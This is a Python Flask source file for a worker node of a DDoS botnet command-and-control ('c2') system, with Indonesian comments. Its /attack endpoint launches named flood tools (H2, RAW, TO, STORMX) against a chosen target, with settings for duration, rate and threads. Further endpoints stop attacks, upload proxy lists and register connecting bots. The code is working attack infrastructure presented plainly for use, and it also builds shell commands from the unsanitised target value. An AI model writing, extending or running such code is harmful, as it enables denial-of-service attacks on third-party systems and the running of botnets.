#!/usr/bin/env python3
from flask import Flask, request, jsonify
import threading
import subprocess
import json
import os
import signal
import psutil
import time
import socket
from datetime import datetime

app = Flask(__name__)

# Load config
with open('/root/c2/config.json', 'r') as f:
    CONFIG = json.load(f)

WORKER_NAME = CONFIG['worker_name']
WORKER_IP = CONFIG['worker_ip']
WORKER_PORT = CONFIG['worker_port']
MASTER_IP = CONFIG['master_ip']
MASTER_PORT = 5000
API_KEY = CONFIG['api_key']
MAX_BOTS = CONFIG['max_bots']

active_tasks = []
attack_processes = []
connected_bots = []

def verify_api_key(headers):
    return headers.get('X-API-Key') == API_KEY

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'name': WORKER_NAME,
        'status': 'online',
        'bots': len(connected_bots),
        'tasks': len(active_tasks),
        'load': psutil.cpu_percent(),
        'memory': psutil.virtual_memory().percent
    })

@app.route('/attack', methods=['POST'])
def start_attack():
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    data = request.json
    method = data['method']
    target = data['target']
    duration = int(data['duration'])
    rate = data.get('rate', 1000)
    threads = int(data.get('threads', 100))
    
    task_id = f"{WORKER_NAME}_{int(time.time())}"
    
    # Pilih tool berdasarkan method
    tool_map = {
        'H2': f"node /root/c2/tools/H2.js {target} {duration} {rate} {threads}",
        'RAW': f"python3 /root/c2/tools/RAW.py {target} {duration} {threads}",
        'TO': f"node /root/c2/tools/TO.js {target} {duration} {threads} {rate}",
        'STORMX': f"python3 /root/c2/tools/STORMX.py {target} {duration} {threads} {rate}"
    }
    
    if method not in tool_map and method != 'ALL':
        return jsonify({'error': 'Invalid method'}), 400
    
    def run_attack():
        try:
            if method == 'ALL':
                # Random pilih method
                import random
                actual_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                cmd = tool_map[actual_method]
            else:
                cmd = tool_map[method]
            
            process = subprocess.Popen(cmd, shell=True, 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE)
            attack_processes.append(process)
            
            active_tasks.append({
                'id': task_id,
                'method': method,
                'target': target,
                'start_time': datetime.now().strftime("%H:%M:%S"),
                'pid': process.pid
            })
            
            # Tunggu selesai
            process.wait()
            
            # Hapus dari list
            if process in attack_processes:
                attack_processes.remove(process)
            
            for task in active_tasks:
                if task['id'] == task_id:
                    active_tasks.remove(task)
                    break
                    
        except Exception as e:
            print(f"[!] Error: {e}")
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'status': 'started',
        'task_id': task_id,
        'worker': WORKER_NAME
    })

@app.route('/stop', methods=['POST'])
def stop_attack():
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    data = request.json
    task_id = data.get('task_id')
    
    for task in active_tasks:
        if task['id'] == task_id:
            try:
                os.kill(task['pid'], signal.SIGTERM)
                active_tasks.remove(task)
                return jsonify({'status': 'stopped'})
            except:
                pass
    
    return jsonify({'error': 'Task not found'}), 404

@app.route('/stop_all', methods=['POST'])
def stop_all():
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    for process in attack_processes:
        try:
            process.terminate()
        except:
            pass
    
    attack_processes.clear()
    active_tasks.clear()
    
    return jsonify({'status': 'all stopped'})

@app.route('/upload_proxy', methods=['POST'])
def upload_proxy():
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    if 'proxy' not in request.files:
        return jsonify({'error': 'No file'}), 400
    
    file = request.files['proxy']
    file.save('/root/c2/proxy.txt')
    return jsonify({'status': 'ok', 'message': 'Proxy updated'})

@app.route('/bot/register', methods=['POST'])
def register_bot():
    data = request.json
    bot_ip = request.remote_addr
    
    if len(connected_bots) >= MAX_BOTS:
        return jsonify({'error': 'Max bots reached'}), 403
    
    bot_info = {
        'id': data.get('bot_id'),
        'ip': bot_ip,
        'hostname': data.get('hostname'),
        'registered': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    connected_bots.append(bot_info)
    return jsonify({'status': 'registered', 'bots': len(connected_bots)})

if __name__ == '__main__':
    # Buat direktori jika belum ada
    os.makedirs('/root/c2/logs', exist_ok=True)
    os.makedirs('/tmp/bots', exist_ok=True)
    
    print(f"[✓] Worker {WORKER_NAME} started on port {WORKER_PORT}")
    app.run(host='0.0.0.0', port=WORKER_PORT, debug=False, threaded=True)